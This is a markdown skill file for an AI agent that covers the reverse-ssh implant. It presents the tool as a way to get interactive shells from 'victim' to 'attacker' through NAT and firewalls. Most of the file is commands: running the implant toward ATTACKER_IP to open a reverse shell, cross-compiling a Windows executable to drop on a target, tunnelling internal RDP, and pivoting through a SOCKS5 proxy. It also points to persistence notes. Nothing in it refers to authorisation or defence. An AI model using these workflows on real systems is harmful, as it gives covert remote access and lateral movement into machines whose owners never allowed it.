---
name: reverse-ssh
description: "Establish reverse SSH tunnels from victim to attacker for interactive shell access behind NAT/firewall. Use when target is not directly reachable and you need a stable SSH shell through outbound-only connections."
license: MIT
compatibility: "Go binary; Linux/macOS/Windows; github.com/Fahrj/reverse-ssh"
metadata:
  author: AeonDave
  version: "1.0"
---

# Reverse-SSH

Reverse SSH tunnel implant — SSH shell through outbound connection, no port forwarding needed.

## Quick Start

```bash
# Attacker: start SSH server (any standard SSH server)
# Default: binds on attacker port 8888

# Victim: run reverse-ssh binary
./reverse-ssh <attacker_ip>:<port>

# Attacker: connect back
ssh -p 8888 localhost          # Interact with victim shell
# Or list connected
ssh -p 8888 127.0.0.1 ls
```

## Common Flags

| Flag | Purpose |
|------|---------|
| `-p PORT` | Local bind port on victim |
| `--ssh-port N` | Attacker SSH server port |
| `-l USER` | Login user |
| `--socks5` | Enable SOCKS5 proxy |
| `--foreground` | Don't daemonize |

## Common Workflows

**Deploy reverse shell:**
```bash
# Compile for Windows target (from Linux)
GOOS=windows GOARCH=amd64 go build -o rev.exe .
# Transfer to victim, execute:
rev.exe ATTACKER_IP:8888
```

**Port forwarding via reverse SSH:**
```bash
# From attacker, tunnel internal RDP
ssh -p 8888 -L 3389:127.0.0.1:3389 localhost
# Connect RDP client to localhost:3389
```

**SOCKS5 proxy:**
```bash
./reverse-ssh --socks5 ATTACKER:8888
# SSH with -D for SOCKS
ssh -p 8888 -D 1080 localhost
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Persistence and cross-compile notes |
